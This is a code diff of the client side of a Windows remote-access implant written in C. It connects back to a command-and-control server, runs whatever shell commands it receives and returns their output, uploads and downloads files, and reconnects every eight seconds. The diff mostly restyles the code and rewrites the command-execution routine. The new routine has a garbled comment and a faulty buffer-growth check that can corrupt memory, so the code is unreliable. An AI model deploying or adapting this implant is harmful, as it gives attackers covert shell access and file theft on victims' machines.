@@ -5,6 +5,7 @@ Use educationally/legally.
 */
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -34,10 +35,10 @@ SOCKET create_socket() {
 }
 
 // Function to connect the connect socket to c2 server.
-int c2_connect(SOCKET connect_socket, const char *host, const int port) {
+int c2_connect(SOCKET connect_socket, const char* host, const int port) {
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
-	
+
 	hint.sin_port = htons(port);
 	inet_pton(AF_INET, host, &hint.sin_addr);
 
@@ -61,14 +62,15 @@ inline uint32_t ntohl_conv(char const* num) {
 
 
 // Function to receive file from client (TCP file transfer).
-int recv_file(char *buf, char* filename, SOCKET connect_socket) {
+int recv_file(char* buf, char* filename, SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
 
 	// Receive file size.
 	if (!recv(connect_socket, buf, sizeof(uint32_t), 0))
 		return SOCKET_ERROR;
 
-	size_t f_size = ntohl_conv(&*(buf));
+	// Serialize f_size.
+	uint32_t f_size = ntohl_conv(&*(buf));
 
 	// Receive all file bytes/chunks and write to parsed filename.
 	int iResult = 1;
@@ -86,17 +88,19 @@ int recv_file(char *buf, char* filename, SOCKET connect_socket) {
 }
 
 // Function for sending file to client (TCP file transfer).
-int send_file(char *filename, SOCKET connect_socket, char *buf) {
+int send_file(char* filename, SOCKET connect_socket, char* buf) {
 	// Open file.
-	FILE *fd = fopen(filename, "rb");
+	FILE* fd = fopen(filename, "rb");
 
 	uint32_t bytes = 0;
 	size_t f_size = 0;
 
 	if (fd) {
+		// Calculate file size.
 		fseek(fd, 0L, SEEK_END);
 		f_size = ftell(fd);
 
+		// Serialize f_size.
 		bytes = htonl(f_size);
 		fseek(fd, 0L, SEEK_SET);
 	}
@@ -127,27 +131,49 @@ int send_file(char *filename, SOCKET connect_socket, char *buf) {
 }
 
 // Function to execute command.
-int exec_cmd(SOCKET connect_socket, char *buf) {
+int exec_cmd(SOCKET connect_socket, char* buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	strcat(buf, " 2>&1");
-    	FILE *fpipe = _popen(buf, "r");
 
-	// Read & send pipe's stdout.
-	int rb, iResult = 1;
-	rb = fread(buf, 1, BUFLEN, fpipe);
+	FILE* fpipe = _popen(buf, "r");
+	int bytes_read;
 
-	if (rb) {
-		do {
-			iResult = send(connect_socket, buf, rb, 0);
-			rb = fread(buf, 1, BUFLEN, fpipe);
-		} while (rb && iResult > 0);
-		// Close the pipe stream.
-		_pclose(fpipe);
-	}
-	else {
-		iResult = send(connect_socket, "\0", 1, 0);
+	if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0) {
+		bytes_read = 1;
+		buf[0] = '\0';
 	}
 
+	uint32_t s_size = bytes_read;
+
+	const int chunk = 24576;
+	int capacity = chunk;
+
+	char *output = malloc(capacity);
+	strcpy(output, buf);
+
+	// Read and store pipe's stdout in output.
+	while (1) {
+		if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0)
+			break;
+		// If s_size hac reake
+		if ((s_size += bytes_read) == capacity)
+			output = realloc(output, (capacity += chunk));
+
+		strcat(output, buf);
+	}
+
+	// Serialize s_size.
+	uint32_t bytes = htonl(s_size);
+
+	// Send serialized bytes.
+	if (!send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0))
+		return SOCKET_ERROR;
+
+	int iResult = send(connect_socket, output, s_size, 0);
+	free(output);
+
+	// Close the pipe stream.
+	_pclose(fpipe);
 
 	return iResult;
 }
@@ -162,7 +188,7 @@ int main(void) {
 		SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-           	  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
+			  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
 		if (connect_socket != INVALID_SOCKET) {
 			int iResult = c2_connect(connect_socket, host, port);
 			while (iResult > 0) {
@@ -192,12 +218,12 @@ int main(void) {
 						// Download file from client system.
 						iResult = send_file(&buf[1], connect_socket, buf);
 						break;
-				}
+					}
 			}
 		}
 		// If unable to connect or an error occurs sleep 8 seconds.
 		Sleep(8000);
 	}
 
-    return -1;
+	return -1;
 }
